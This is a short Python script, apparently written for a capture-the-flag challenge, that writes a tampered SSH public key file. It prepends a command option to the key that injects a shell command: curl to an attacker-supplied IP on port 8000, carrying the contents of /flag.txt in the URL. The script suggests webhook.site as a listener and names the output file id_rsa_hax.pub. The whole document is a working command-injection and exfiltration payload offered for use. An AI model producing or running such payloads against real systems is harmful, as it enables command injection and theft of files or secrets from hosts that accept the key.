with open("id_rsa.pub", "rb") as f:
    pubkey = f.read()

# Replace YOUR_IP with your public IP (or use https://webhook.site/ for a quick listener)
payload = b'\x00command=`curl http://YOUR_IP:8000/$(cat /flag.txt)` ' + pubkey

with open("id_rsa_hax.pub", "wb") as f:
    f.write(payload)

print("[+] Malicious public key with exfiltration written to id_rsa_hax.pub")
